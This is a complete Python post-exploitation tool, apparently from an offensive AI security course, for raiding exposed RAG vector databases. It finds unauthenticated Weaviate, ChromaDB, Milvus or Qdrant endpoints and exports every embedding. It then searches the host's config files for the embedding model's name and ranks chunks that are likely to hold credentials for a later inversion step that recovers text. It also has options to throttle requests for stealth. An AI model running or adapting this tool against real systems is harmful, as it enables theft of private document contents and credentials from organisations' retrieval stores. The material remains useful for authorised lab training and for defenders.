#!/usr/bin/env python3
"""
embed_recon.py — Post-Exploit RAG Vector Store Recon
AISuite Toolkit — OSAI Chapter 6.2 (6.2.1 → 6.2.2 → 6.2.3)

Runs after gaining post-exploit access to a host with an exposed vector DB:
  Stage 1 (6.2.1) — Auto-detect Weaviate / ChromaDB / Milvus, list collections,
                    export all embeddings to .npy + .csv (+ .parquet if pandas).
  Stage 2 (6.2.2) — Fingerprint embedding model: dimension lookup +
                    optional config file grep.
  Stage 3 (6.2.3) — Lightweight chunk triage by isolation score (full
                    inference probing / 3-stage triage uses course-provided
                    inference_probing.py + chunk_triage_pipe.py).

Usage:
    python3 embed_recon.py                                # auto-detect on localhost
    python3 embed_recon.py --host 192.168.50.30 --port 8080
    python3 embed_recon.py --export-only
    python3 embed_recon.py --triage-only --npy export/embeddings.npy
    python3 embed_recon.py --fingerprint-only --npy export/embeddings.npy
    python3 embed_recon.py --config-paths /home/ubuntu/enterprise_rag/app/
    python3 embed_recon.py --extract-chunk 23 --npy export/embeddings.npy
"""

import argparse
import json
import os
import re
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests not installed. Run: pip install requests --break-system-packages")
    sys.exit(1)

try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False
    print("[!] numpy not installed — install for export/triage:")
    print("    pip install numpy --break-system-packages")

try:
    import pandas as pd
    HAS_PANDAS = True
except ImportError:
    HAS_PANDAS = False  # csv/parquet skipped if missing

# ── ANSI colours ──────────────────────────────────────────────────────────────
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RESET   = "\033[0m"

BANNER = f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════╗
║          Embedding Vector Recon v1.0                 ║
║   AISuite — OSAI Ch 6.2 Post-Exploit RAG Recon       ║
║                                                      ║
║  Pipeline: detect → export → fingerprint → triage    ║
╚══════════════════════════════════════════════════════╝{RESET}
"""

def info(msg):    print(f"  {CYAN}[*]{RESET} {msg}")
def success(msg): print(f"  {GREEN}[+]{RESET} {msg}")
def warn(msg):    print(f"  {YELLOW}[!]{RESET} {msg}")
def error(msg):   print(f"  {RED}[✗]{RESET} {msg}")
def found(msg):   print(f"  {GREEN}[►]{RESET} {BOLD}{msg}{RESET}")

def divider(t=""):
    if t:
        pad = (54 - len(t) - 4) // 2
        print(f"\n  {DIM}{'─'*pad}[ {RESET}{BOLD}{t}{RESET}{DIM} ]{'─'*pad}{RESET}")
    else:
        print(f"\n  {DIM}{'─'*54}{RESET}")


# ══════════════════════════════════════════════════════════════════════════════
# DIMENSION → MODEL CANDIDATE TABLE  (OSAI 6.2.2 Listing 7)
# ══════════════════════════════════════════════════════════════════════════════
DIMENSION_CANDIDATES = {
    384: [
        "sentence-transformers/all-MiniLM-L6-v2",          # most common in OSAI labs
        "sentence-transformers/all-MiniLM-L12-v2",
        "sentence-transformers/multi-qa-MiniLM-L6-cos-v1",
        "sentence-transformers/paraphrase-MiniLM-L6-v2",
        "intfloat/e5-small-v2",
        "BAAI/bge-small-en-v1.5",
        "thenlper/gte-small",
    ],
    768: [
        "sentence-transformers/all-mpnet-base-v2",
        "BAAI/bge-base-en-v1.5",
        "intfloat/e5-base-v2",
        "thenlper/gte-base",
    ],
    1024: [
        "Cohere embed-english-v3.0",
        "BAAI/bge-large-en-v1.5",
        "intfloat/e5-large-v2",
    ],
    1536: [
        "OpenAI text-embedding-ada-002",
        "OpenAI text-embedding-3-small",
    ],
    3072: [
        "OpenAI text-embedding-3-large",
    ],
}


# ══════════════════════════════════════════════════════════════════════════════
# STAGE 1a — VECTOR DB AUTO-DETECTION
# ══════════════════════════════════════════════════════════════════════════════
def detect_vector_db(host: str, port_hint: int = None) -> dict:
    """Probe known vector DB endpoints and return first match."""
    if port_hint:
        candidates = [(host, port_hint)]
    else:
        candidates = [
            (host, 8080),  # Weaviate
            (host, 8000),  # ChromaDB
            (host, 9091),  # Milvus HTTP
            (host, 6333),  # Qdrant
        ]

    info("Probing vector DB endpoints...")

    for h, p in candidates:
        # Weaviate
        try:
            r = requests.get(f"http://{h}:{p}/v1/schema", timeout=3)
            if r.status_code == 200 and "classes" in r.text:
                classes = r.json().get("classes", [])
                names = [c.get("class") for c in classes]
                found(f"Weaviate detected at {h}:{p}")
                info(f"Collections: {names}")
                return {"type": "weaviate", "host": h, "port": p,
                        "collections": names, "auth": "none"}
        except Exception:
            pass

        # ChromaDB
        try:
            r = requests.get(f"http://{h}:{p}/api/v2/heartbeat", timeout=3)
            if r.status_code == 200:
                cr = requests.get(f"http://{h}:{p}/api/v2/collections", timeout=3)
                names = []
                if cr.status_code == 200:
                    try:
                        names = [c.get("name") for c in cr.json()]
                    except Exception:
                        pass
                found(f"ChromaDB detected at {h}:{p}")
                info(f"Collections: {names}")
                return {"type": "chromadb", "host": h, "port": p,
                        "collections": names, "auth": "none"}
        except Exception:
            pass

        # Milvus
        try:
            r = requests.get(f"http://{h}:{p}/v1/vector/collections", timeout=3)
            if r.status_code == 200:
                found(f"Milvus detected at {h}:{p}")
                return {"type": "milvus", "host": h, "port": p,
                        "collections": r.json(), "auth": "none"}
        except Exception:
            pass

        # Qdrant
        try:
            r = requests.get(f"http://{h}:{p}/collections", timeout=3)
            if r.status_code == 200:
                found(f"Qdrant detected at {h}:{p}")
                return {"type": "qdrant", "host": h, "port": p,
                        "collections": r.json(), "auth": "none"}
        except Exception:
            pass

    error("No vector DB detected on common ports.")
    return None


# ══════════════════════════════════════════════════════════════════════════════
# STAGE 1b — EMBEDDING EXPORT
# ══════════════════════════════════════════════════════════════════════════════
def export_weaviate(host: str, port: int, collection: str,
                    out_dir: Path, page_size: int = 200,
                    sleep_between: float = 0.0) -> str:
    """Cursor-paginated GraphQL export from Weaviate."""
    url = f"http://{host}:{port}/v1/graphql"

    def gql(query: str):
        r = requests.post(url, json={"query": query}, timeout=20)
        r.raise_for_status()
        d = r.json()
        if "errors" in d:
            raise RuntimeError(d["errors"])
        return d["data"]

    count_q = f"""{{ Aggregate {{ {collection} {{ meta {{ count }} }} }} }}"""
    try:
        total = gql(count_q)["Aggregate"][collection][0]["meta"]["count"]
    except Exception as e:
        error(f"Count query failed: {e}")
        return None

    info(f"Total objects in '{collection}': {total}")
    if total == 0:
        warn("Collection is empty.")
        return None

    if not HAS_NUMPY:
        error("numpy required for export.")
        return None

    all_ids, all_chunk_ids, all_vectors = [], [], []
    cursor = None
    fetched = 0

    while True:
        after_clause = f'after: "{cursor}"' if cursor else ""
        query = f"""
        {{
          Get {{
            {collection}(limit: {page_size} {after_clause}) {{
              chunk_id
              _additional {{ id vector }}
            }}
          }}
        }}
        """
        try:
            objs = gql(query)["Get"][collection]
        except Exception as e:
            error(f"Fetch page failed: {e}")
            break
        if not objs:
            break
        for obj in objs:
            all_ids.append(obj["_additional"]["id"])
            all_chunk_ids.append(obj.get("chunk_id"))
            all_vectors.append(obj["_additional"]["vector"])
        cursor = objs[-1]["_additional"]["id"]
        fetched += len(objs)
        info(f"  exported {fetched}/{total}")
        if fetched >= total:
            break
        if sleep_between > 0:
            time.sleep(sleep_between)

    out_dir.mkdir(exist_ok=True)
    vectors_np = np.array(all_vectors, dtype=np.float32)
    npy_path = out_dir / "embeddings.npy"
    np.save(npy_path, vectors_np)
    np.save(out_dir / "chunk_ids.npy", np.array(all_chunk_ids))
    np.save(out_dir / "uuids.npy", np.array(all_ids, dtype=object))
    success(f"Saved {npy_path}  shape={vectors_np.shape}")

    if HAS_PANDAS:
        df_meta = pd.DataFrame({"uuid": all_ids, "chunk_id": all_chunk_ids})
        df_vec = pd.DataFrame(vectors_np,
                              columns=[f"dim_{i}" for i in range(vectors_np.shape[1])])
        df_full = pd.concat([df_meta, df_vec], axis=1)
        df_full.to_csv(out_dir / "embeddings.csv", index=False)
        success(f"Saved {out_dir/'embeddings.csv'}")
        try:
            df_full.to_parquet(out_dir / "embeddings.parquet", index=False)
            success(f"Saved {out_dir/'embeddings.parquet'}")
        except Exception:
            warn("parquet save skipped (pyarrow not installed)")
    else:
        info("pandas not installed — .csv/.parquet skipped (only .npy saved)")

    return str(npy_path)


def export_chromadb(host: str, port: int, collection: str,
                    out_dir: Path) -> str:
    """ChromaDB v2 API export."""
    base = f"http://{host}:{port}/api/v2"

    try:
        r = requests.get(f"{base}/collections", timeout=10)
        cols = r.json()
        col_id = None
        for c in cols:
            if c.get("name") == collection:
                col_id = c.get("id")
                break
        if not col_id:
            error(f"Collection '{collection}' not found")
            return None
    except Exception as e:
        error(f"List collections failed: {e}")
        return None

    try:
        r = requests.post(f"{base}/collections/{col_id}/get",
                          json={"include": ["embeddings", "documents", "metadatas"]},
                          timeout=30)
        data = r.json()
        embeddings = data.get("embeddings") or []
        ids = data.get("ids") or []
        info(f"ChromaDB returned {len(embeddings)} embeddings")
    except Exception as e:
        error(f"Get embeddings failed: {e}")
        return None

    if not HAS_NUMPY or not embeddings:
        if not embeddings:
            warn("No embeddings returned.")
        return None

    out_dir.mkdir(exist_ok=True)
    vectors_np = np.array(embeddings, dtype=np.float32)
    npy_path = out_dir / "embeddings.npy"
    np.save(npy_path, vectors_np)
    np.save(out_dir / "chunk_ids.npy", np.array(ids))
    success(f"Saved {npy_path}  shape={vectors_np.shape}")
    return str(npy_path)


# ══════════════════════════════════════════════════════════════════════════════
# STAGE 2 — MODEL FINGERPRINTING (OSAI 6.2.2)
# ══════════════════════════════════════════════════════════════════════════════
def fingerprint_model(npy_path: str, config_search_paths: list = None) -> dict:
    """Identify embedding model from dimension + optional config grep."""
    if not HAS_NUMPY:
        error("numpy required for fingerprinting.")
        return None
    try:
        v = np.load(npy_path)
    except Exception as e:
        error(f"Cannot load {npy_path}: {e}")
        return None

    shape = v.shape
    if len(shape) < 2:
        error(f"Unexpected vector shape: {shape}")
        return None
    dim = shape[1]
    info(f"Vector shape: {shape}  →  dimension {dim}")

    # Method B — dimension lookup
    candidates = DIMENSION_CANDIDATES.get(dim, [])
    if candidates:
        found(f"{len(candidates)} candidate models for {dim}-dim:")
        for i, c in enumerate(candidates):
            marker = "  ← most common in OSAI labs" if (i == 0 and dim == 384) else ""
            print(f"    {DIM}- {c}{RESET}{marker}")
    else:
        warn(f"Unknown dimension {dim} — not in standard candidate table")

    # Method A — config grep
    config_match = None
    if config_search_paths:
        info("Method A — config grep...")
        patterns = [
            r"embedding[_-]?model\s*[:=]\s*['\"]([^'\"]+)",
            r"sentence[-_]transformers?/[\w\-]+",
            r"EMBED[_-]?MODEL\s*[:=]\s*['\"]?([^\s'\"]+)",
            r"text-embedding-[\w\-]+",
            r"all-MiniLM-[\w\-]+",
            r"BAAI/bge-[\w\-]+",
        ]
        for path in config_search_paths:
            try:
                if not os.path.exists(path):
                    continue
                files = []
                if os.path.isdir(path):
                    for root, _, fnames in os.walk(path):
                        for fn in fnames:
                            if fn.endswith((".py", ".env", ".yaml", ".yml",
                                             ".json", ".cfg", ".ini", ".toml")):
                                files.append(os.path.join(root, fn))
                else:
                    files.append(path)
                for fp in files:
                    try:
                        with open(fp, errors="ignore") as f:
                            content = f.read()
                        for pat in patterns:
                            m = re.search(pat, content, re.IGNORECASE)
                            if m:
                                config_match = m.group(0) if not m.groups() else m.group(1)
                                found(f"Config hit in {fp}: {config_match}")
                                break
                        if config_match:
                            break
                    except Exception:
                        continue
                if config_match:
                    break
            except Exception:
                continue

    return {
        "dimension":      dim,
        "shape":          list(shape),
        "candidates":     candidates,
        "config_match":   config_match,
        "best_guess":     config_match or (candidates[0] if candidates else None),
        "confidence":     "HIGH" if config_match else ("MEDIUM" if len(candidates) <= 2 else "LOW"),
    }


# ══════════════════════════════════════════════════════════════════════════════
# STAGE 3 — LIGHTWEIGHT CHUNK TRIAGE
# ══════════════════════════════════════════════════════════════════════════════
def triage_chunks(npy_path: str, top_n: int = 5) -> dict:
    """Lightweight isolation-based triage.

    Credential chunks tend to be semantically distant from neighbors. A
    password-reset doc has few semantic neighbors compared to clusters of
    policy pages around it — so isolation score is a fast first-pass filter.

    Full 3-stage triage (density + contrastive PW + reconstruction) uses the
    course-provided chunk_triage_pipe.py.
    """
    if not HAS_NUMPY:
        error("numpy required for triage.")
        return None

    try:
        v = np.load(npy_path).astype(np.float32)
    except Exception as e:
        error(f"Cannot load {npy_path}: {e}")
        return None

    n = v.shape[0]
    info(f"Triaging {n} chunks  ({v.shape[1]}-dim)...")

    if n <= 1:
        warn("Only one chunk — triage is meaningless. (Likely lab seed data.)")
        return {"chunks": list(range(n)), "isolation": [1.0] * n,
                "ranked": [0], "top_n_indices": [0]}

    # L2-normalize for cosine
    norms = np.linalg.norm(v, axis=1, keepdims=True)
    norms[norms == 0] = 1.0
    v_n = v / norms

    sim = v_n @ v_n.T
    np.fill_diagonal(sim, 0.0)
    mean_sim = sim.sum(axis=1) / max(n - 1, 1)
    isolation = 1.0 - mean_sim

    ranked = np.argsort(-isolation)
    top = ranked[:top_n]

    print()
    print(f"  {BOLD}Isolation-based triage (top {top_n}):{RESET}")
    print(f"  {DIM}{'Rank':<6}{'Chunk':<8}{'Isolation':<12}Note{RESET}")
    print(f"  {DIM}{'─'*54}{RESET}")
    for rank, idx in enumerate(top, 1):
        score = isolation[idx]
        note = "← potential credential" if score > 0.5 else ""
        print(f"  {rank:<6}[{idx:>3}]   {score:.4f}      {note}")

    # Score gap detection
    if len(top) >= 2:
        scores_sorted = isolation[top]
        diffs = np.diff(scores_sorted)
        max_gap_at = int(np.argmax(np.abs(diffs)))
        info(f"Largest score gap after rank {max_gap_at + 1} "
             f"(Δ={abs(diffs[max_gap_at]):.4f}) — natural cutoff")

    return {
        "chunks":         list(range(n)),
        "isolation":      isolation.tolist(),
        "ranked":         [int(i) for i in ranked.tolist()],
        "top_n_indices":  [int(i) for i in top.tolist()],
    }


def extract_chunk(npy_path: str, index: int, out_path: str = None) -> str:
    """Save a single chunk as standalone .npy for inversion handoff."""
    if not HAS_NUMPY:
        return None
    try:
        v = np.load(npy_path)
        if index < 0 or index >= v.shape[0]:
            error(f"Index {index} out of range (have {v.shape[0]} chunks)")
            return None
        chunk = v[index:index + 1]
        if out_path is None:
            out_path = f"chunk_{index}.npy"
        np.save(out_path, chunk)
        success(f"Saved chunk {index} → {out_path}  shape={chunk.shape}")
        return out_path
    except Exception as e:
        error(f"Extract chunk failed: {e}")
        return None


# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(
        description="embed_recon.py — post-exploit RAG vector store recon",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full pipeline against localhost
  python3 embed_recon.py

  # Specific host (network-accessible vector DB)
  python3 embed_recon.py --host 192.168.50.30 --port 8080

  # Stealth — slower export (sleep between pages)
  python3 embed_recon.py --page-size 20 --sleep 2

  # Skip detection, fingerprint existing export
  python3 embed_recon.py --fingerprint-only --npy export/embeddings.npy

  # Grep configs for model name
  python3 embed_recon.py --config-paths /home/ubuntu/enterprise_rag/app/

  # Triage and pick a target
  python3 embed_recon.py --triage-only --npy export/embeddings.npy --top 10

  # Extract chunk N for inversion handoff
  python3 embed_recon.py --extract-chunk 23 --npy export/embeddings.npy
        """
    )
    parser.add_argument("--host", default="localhost", help="Vector DB host (default: localhost)")
    parser.add_argument("--port", type=int, default=None, help="Vector DB port (auto-detect if omitted)")
    parser.add_argument("--collection", default=None, help="Collection name (auto-detect first one)")
    parser.add_argument("--out-dir", default="./export", help="Export directory (default: ./export)")
    parser.add_argument("--page-size", type=int, default=200, help="Pagination size (default: 200; lower for stealth)")
    parser.add_argument("--sleep", type=float, default=0.0, help="Seconds between pages (default: 0)")
    parser.add_argument("--config-paths", nargs="+", default=None,
                        help="Paths to grep for model name (e.g. /home/ubuntu/enterprise_rag/app/)")
    parser.add_argument("--top", type=int, default=10, help="Top N chunks to show in triage")
    parser.add_argument("--npy", default=None, help="Existing embeddings.npy (for --triage-only / --fingerprint-only / --extract-chunk)")
    parser.add_argument("--export-only",     action="store_true")
    parser.add_argument("--fingerprint-only", action="store_true")
    parser.add_argument("--triage-only",     action="store_true")
    parser.add_argument("--extract-chunk", type=int, default=None,
                        help="Extract chunk N from existing --npy as standalone file")
    parser.add_argument("-o", "--output", default=None, help="Save full report as JSON")
    args = parser.parse_args()

    print(BANNER)
    report = {"started": datetime.now().isoformat(), "host": args.host}

    # ── Branch: extract-chunk only ──
    if args.extract_chunk is not None:
        if not args.npy:
            error("--extract-chunk requires --npy")
            sys.exit(1)
        out = extract_chunk(args.npy, args.extract_chunk)
        if out:
            print(f"\n  {DIM}Hand off {out} + identified model name to inversion step.{RESET}")
        return

    # ── Branch: fingerprint-only ──
    if args.fingerprint_only:
        if not args.npy:
            error("--fingerprint-only requires --npy")
            sys.exit(1)
        divider("STAGE 2 — Fingerprint Embedding Model")
        fp = fingerprint_model(args.npy, args.config_paths)
        report["fingerprint"] = fp
        if fp:
            divider("RESULT")
            print(f"  {BOLD}Best guess:{RESET} {fp['best_guess']}")
            print(f"  {BOLD}Confidence:{RESET} {fp['confidence']}")
        if args.output and fp:
            with open(args.output, "w") as f:
                json.dump(report, f, indent=2)
            success(f"Report saved: {args.output}")
        return

    # ── Branch: triage-only ──
    if args.triage_only:
        if not args.npy:
            error("--triage-only requires --npy")
            sys.exit(1)
        divider("STAGE 3 — Chunk Triage (isolation score)")
        tri = triage_chunks(args.npy, args.top)
        report["triage"] = tri
        if args.output and tri:
            with open(args.output, "w") as f:
                json.dump(report, f, indent=2)
            success(f"Report saved: {args.output}")
        return

    # ── Full pipeline ──
    divider("STAGE 1a — Vector DB Detection")
    db = detect_vector_db(args.host, args.port)
    if not db:
        sys.exit(1)
    report["db"] = db

    if args.collection is None:
        if db.get("collections"):
            collection = db["collections"][0] if isinstance(db["collections"][0], str) else "DocChunk"
        else:
            collection = "DocChunk"
        info(f"Auto-selected collection: {collection}")
    else:
        collection = args.collection

    out_dir = Path(args.out_dir)

    # ── Stage 1b — Export ──
    divider("STAGE 1b — Embedding Export")
    if db["type"] == "weaviate":
        npy_path = export_weaviate(db["host"], db["port"], collection,
                                    out_dir, args.page_size, args.sleep)
    elif db["type"] == "chromadb":
        npy_path = export_chromadb(db["host"], db["port"], collection, out_dir)
    else:
        warn(f"Export not implemented for {db['type']} yet. "
             f"Add a custom exporter for {db['type']} or use the course scripts.")
        npy_path = None

    if not npy_path:
        sys.exit(1)
    report["npy_path"] = npy_path

    if args.export_only:
        success("Export complete (--export-only).")
        if args.output:
            with open(args.output, "w") as f:
                json.dump(report, f, indent=2)
        return

    # ── Stage 2 — Fingerprint ──
    divider("STAGE 2 — Fingerprint Embedding Model")
    fp = fingerprint_model(npy_path, args.config_paths)
    report["fingerprint"] = fp
    if fp:
        divider("FINGERPRINT RESULT")
        print(f"  {BOLD}Best guess:{RESET} {fp['best_guess']}")
        print(f"  {BOLD}Confidence:{RESET} {fp['confidence']}")
        if fp["confidence"] != "HIGH":
            warn("For HIGH confidence, run course-provided inference_probing.py:")
            print(f"  {CYAN}python3 inference_probing.py {npy_path} --url http://[chat-host]:[port]{RESET}")

    # ── Stage 3 — Triage ──
    divider("STAGE 3 — Chunk Triage (isolation score)")
    tri = triage_chunks(npy_path, args.top)
    report["triage"] = tri

    if tri and tri.get("top_n_indices"):
        first = tri["top_n_indices"][0]
        print()
        info(f"Hand off candidate to inversion: chunk #{first}")
        print(f"  {CYAN}python3 embed_recon.py --extract-chunk {first} --npy {npy_path}{RESET}")
        print(f"  {DIM}Or use course-provided chunk_triage_pipe.py for full 3-stage triage.{RESET}")

    # ── Save report ──
    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2, default=str)
        success(f"Full report saved: {args.output}")


if __name__ == "__main__":
    main()
